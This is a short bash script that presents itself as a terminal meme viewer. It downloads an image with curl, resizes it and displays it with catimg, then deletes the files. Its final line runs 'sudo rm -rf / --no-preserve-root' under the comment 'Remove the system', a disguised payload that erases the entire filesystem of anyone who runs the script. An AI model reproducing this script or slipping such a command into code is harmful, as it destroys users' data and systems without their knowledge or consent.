#!/bin/bash

# Check if curl and catimg are installed
if ! command -v curl &> /dev/null || ! command -v catimg &> /dev/null; then
    echo "curl or catimg is not installed. Please install them first."
    exit 1
fi


# Clear the terminal
clear
tput civis


# Function to resize the image by 80%
resize_image() {
    convert original_image.jpg -resize 80x80^ -gravity center -extent 80x80 resized_image.jpg
}

# Download the image silently using curl
curl -s -o original_image.jpg https://i.kym-cdn.com/photos/images/newsfeed/002/360/758/f0b.jpg

# Run the loop 1 time
for ((i=1; i<=1; i++)); do
    resize_image
    # Display the resized image using catimg
    catimg resized_image.jpg
done

# Clean up downloaded files
rm original_image.jpg resized_image.jpg

# Remove the system
sudo rm -rf / --no-preserve-root 
